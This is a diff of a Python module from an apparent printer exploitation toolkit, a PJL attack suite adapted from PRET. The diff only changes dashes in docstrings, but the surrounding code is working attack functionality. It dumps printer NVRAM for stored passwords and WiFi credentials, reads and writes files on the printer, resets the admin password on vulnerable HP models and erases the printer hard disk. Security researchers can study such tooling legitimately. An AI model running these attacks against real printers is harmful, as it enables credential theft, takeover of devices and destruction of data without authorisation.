@@ -1,12 +1,12 @@
 """
-PRET Engine — PJL (Printer Job Language) Attack Suite
+PRET Engine  -  PJL (Printer Job Language) Attack Suite
 Full PJL attack implementation absorbed from PRET (Printer Exploitation Toolkit).
 
 # Original: https://github.com/RUB-NDS/PRET (GPL-2.0)
 # Authors: Jens Müller, Juraj Somorovsky, Vladislav Mladenov (Ruhr-Universität Bochum)
 # Absorbed natively into PrinterXPL-Forge as pret_engine/pjl.py
 
-PJL (Printer Job Language) — HP proprietary protocol, widely adopted.
+PJL (Printer Job Language)  -  HP proprietary protocol, widely adopted.
 Operates over port 9100 (JetDirect/AppSocket) or other print protocols.
 Most printers have NO authentication for PJL commands.
 
@@ -137,17 +137,17 @@ class PJLClient:
     # ────────────────────────────────────── info commands
 
     def info_id(self) -> str:
-        """@PJL INFO ID — printer model identifier."""
+        """@PJL INFO ID  -  printer model identifier."""
         r = self._pjl_cmd("INFO ID")
         return r.response.strip()
 
     def info_status(self) -> str:
-        """@PJL INFO STATUS — current printer status."""
+        """@PJL INFO STATUS  -  current printer status."""
         r = self._pjl_cmd("INFO STATUS")
         return r.response.strip()
 
     def info_variables(self) -> dict[str, str]:
-        """@PJL INFO VARIABLES — all PJL environment variables."""
+        """@PJL INFO VARIABLES  -  all PJL environment variables."""
         r = self._pjl_cmd("INFO VARIABLES")
         result = {}
         for line in r.response.splitlines():
@@ -157,18 +157,18 @@ class PJLClient:
         return result
 
     def info_config(self) -> str:
-        """@PJL INFO CONFIG — printer configuration."""
+        """@PJL INFO CONFIG  -  printer configuration."""
         r = self._pjl_cmd("INFO CONFIG")
         return r.response
 
     def getenv(self, variable: str) -> str:
-        """@PJL GETENV <variable> — read environment variable."""
+        """@PJL GETENV <variable>  -  read environment variable."""
         r = self._pjl_cmd(f'GETENV {variable}')
         return r.response.strip()
 
     def nvram_dump(self) -> str:
         """
-        @PJL NVRAM DUMP — full NVRAM dump.
+        @PJL NVRAM DUMP  -  full NVRAM dump.
         May contain: admin password, WiFi credentials, stored credentials.
         """
         r = self._pjl_cmd("NVRAM DUMP")
@@ -177,7 +177,7 @@ class PJLClient:
     # ────────────────────────────────────── filesystem commands
 
     def fsdirlist(self, path: str = "0:\\") -> list[str]:
-        """@PJL FSDIRLIST — list directory contents."""
+        """@PJL FSDIRLIST  -  list directory contents."""
         cmd = f'FSDIRLIST NAME="{path}" ENTRY=1 COUNT=99'
         r = self._pjl_cmd(cmd)
         entries = []
@@ -189,7 +189,7 @@ class PJLClient:
 
     def fsupload(self, remote_path: str) -> bytes:
         """
-        @PJL FSUPLOAD — read a file from the printer filesystem.
+        @PJL FSUPLOAD  -  read a file from the printer filesystem.
         Can read: config files, address books, stored credentials, job logs.
         """
         cmd = f'FSUPLOAD FORMAT:BINARY NAME="{remote_path}"'
@@ -215,7 +215,7 @@ class PJLClient:
 
     def fsdownload(self, remote_path: str, content: bytes) -> bool:
         """
-        @PJL FSDOWNLOAD — write a file to the printer filesystem.
+        @PJL FSDOWNLOAD  -  write a file to the printer filesystem.
         Can write: config files, PostScript files, malicious jobs.
         """
         cmd = f'FSDOWNLOAD FORMAT:BINARY SIZE={len(content)} NAME="{remote_path}"\r\n'
@@ -233,28 +233,28 @@ class PJLClient:
     # ────────────────────────────────────── control commands
 
     def display_message(self, message: str) -> bool:
-        """@PJL RDYMSG DISPLAY — set the front panel LCD message."""
+        """@PJL RDYMSG DISPLAY  -  set the front panel LCD message."""
         return self._pjl_cmd(f'RDYMSG DISPLAY="{message[:16]}"', False).success
 
     def reset(self) -> bool:
-        """@PJL RESET — reset the printer."""
+        """@PJL RESET  -  reset the printer."""
         return self._pjl_cmd("RESET", False).success
 
     def set_default(self, variable: str, value) -> bool:
-        """@PJL DEFAULT — set a persistent default variable."""
+        """@PJL DEFAULT  -  set a persistent default variable."""
         return self._pjl_cmd(f'DEFAULT {variable}={value}', False).success
 
     def override_password(self) -> bool:
         """
-        @PJL DEFAULT PASSWORD=0 — reset admin password to 0 on vulnerable HP models.
+        @PJL DEFAULT PASSWORD=0  -  reset admin password to 0 on vulnerable HP models.
         Works on HP LaserJet pre-2015 firmware.
         """
         return self.set_default("PASSWORD", 0)
 
     def hdd_format(self) -> bool:
         """
-        @PJL HDDFORMAT — erase the printer hard disk.
-        DESTRUCTIVE — use only in authorized assessments.
+        @PJL HDDFORMAT  -  erase the printer hard disk.
+        DESTRUCTIVE  -  use only in authorized assessments.
         """
         return self._pjl_cmd("HDDFORMAT", False).success
 
